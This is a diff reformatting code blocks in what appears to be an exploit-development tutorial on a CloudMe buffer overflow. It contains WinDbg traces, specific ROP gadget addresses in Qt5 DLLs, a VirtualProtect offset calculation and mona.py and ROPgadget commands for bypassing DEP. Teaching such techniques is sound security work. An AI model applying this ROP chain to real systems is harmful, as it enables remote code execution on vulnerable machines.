@@ -1268,7 +1268,8 @@ except Exception as e:
 Below is the debugging session with <b>WinDbg</b> which shows the ROP gadgets in action:
 </p>
 
-```
+
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0:000> bp 0x6998fb2e
 *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll - 
 0:000> bl
@@ -1371,8 +1372,7 @@ eip=68ae8a24 esp=0022d6b0 ebp=00000000 iopl=0 nv up ei pl nz ac po nc
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212
 Qt5Core!ZNK12QEasingCurve4typeEv+0x4:
 68ae8a24 c3 ret
-```
-
+</pre>
 
 <p align="justify">
 As seen above in red, after the <b>MOV EAX,DWORD PTR [EAX]</b> instruction is executed, the leaked kernel address is now loaded into EAX. Below we are doing the same demonstration with <b>Immunity Debugger</b> which shows the leaked <b>kernel32</b> address at the stack pane below:
@@ -1397,10 +1397,11 @@ At this point we can calculate the <b>VirtualProtect</b> address using the leake
 
 At this section we will see how to calculate the address of **VirtualProtect** in order to bypass DEP. First let’s find the address of **VirtualProtect** using **WinDBG.&nbsp;**
 
-```
+
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0:019\> x kernel32!VirtualProtect 
-762a20d8 kernel32!VirtualProtect (<no parameter info>)
-```
+762a20d8 kernel32!VirtualProtect (< no parameter info >)
+</pre>
 
 
 <p align="justify">
@@ -1408,10 +1409,9 @@ So, as we see above , the <b>VirtualProtect</b> address is <b>0x762a20d8</b>.&nb
 </p>
 
 
-```
-0:019\> ? kernel32!VirtualProtect - 0x762f3c45 
-Evaluate expression: -334701 = fffae493
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+0:019> ? kernel32!VirtualProtect - 0x762f3c45 
+</pre>
 
 
 <p align="justify">
@@ -1419,11 +1419,11 @@ The following gadgets have been found and used in order to load the <b>VirtualPr
 </p>
 
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0x68a812c9 # POP EBP # RETN [Qt5Core.dll]
 0xfffae493 # Offset
 0x61ba8137 # ADD EAX,EBP # RETN [Qt5Gui.dll]
-```
+</pre>
 
 <p align="justify">
 At the first gadget, EBP is assigned with the hex value <b>0xfffae493</b>. Then, adding the two values from EAX and EBP will then give us the address of <b>VirtualProtect</b> and the result will be saved in EAX.
@@ -1491,7 +1491,7 @@ Below is a snippet of the debugging session illustrating the newly added ROP gad
 </p>
 
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0:000> bp 0x6998fb2e
 *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll - 
 0:000> bl
@@ -1619,7 +1619,7 @@ eip=61ba8139 esp=0022d6bc ebp=fffae493 iopl=0 nv up ei pl nz na pe cy
 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000207
 Qt5Gui!ZN7QWindow4setXEi+0x79:
 61ba8139 c3 ret
-```
+</pre>
 
 <p align="justify">
 As shown above in red, after executing the last gadget, the address of <b>VirtualProtect</b> ( <b>0x762a20d8</b> ) will be stored in the <b>EAX</b> register.
@@ -1633,7 +1633,7 @@ As shown above in red, after executing the last gadget, the address of <b>Virtua
 This section shows how to bypass DEP by using <b>VirtualProtect</b> in order to set the access protection to <b>PAGE_EXECUTE_READWRITE</b> on the memory region containing the shellcode. The following parameters must be specified in order to successfully execute <b>VirtualProtect</b> :
 </p>
 
-```
+```c
 BOOL WINAPI VirtualProtect(
           __in   LPVOID lpAddress,
           __in   SIZE_T dwSize,
@@ -1657,7 +1657,7 @@ The <b>PUSHAD</b> instruction&nbsp; <b>always</b> pushes all 8 general purpose r
 </p>
 
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 Push EAX
 Push ECX
 Push EDX
@@ -1666,11 +1666,12 @@ Push ESP
 Push EBP
 Push ESI
 Push EDI
-```
+</pre>
 
 So, in our case the arguments of **VirtualProtect** will be pushed in stack using **PUSHAD** as follows.
 
-```
+
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 Stack:
 EAX (NOP)
 ECX (lpflOldProtect)
@@ -1680,15 +1681,16 @@ ESP (lpAddress)
 EBP (ReturnAddress)
 ESI (VirtualProtect)
 EDI (ROP NOP) 
-```
+</pre>
 
 From **Windbg** , using **mona.py** we can generate the ROP chain as follows
 
-```
+
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0:000> !load pykd.pyd
 0:000> !py mona rop -n -o
 [...]
-```
+</pre>
 
 
 <p align="justify">
@@ -1700,9 +1702,10 @@ Unfortunately, the ROP chains generated with <b>mona.py</b> won't fit our needs,
 Also one missing gadget added to the chain ( <b>jmp esp</b> ) which has been produced by <b>ROPgadget</b> tool :
 </p>
 
-```
+
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 python ROPgadget.py --binary "C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\libwinpthread-1.dll" --only "jmp" --depth 5 --badbytes "00"
-```
+</pre>
 
 The following snippet shows the setup of **VirtualProtect** using ROP gadgets
 
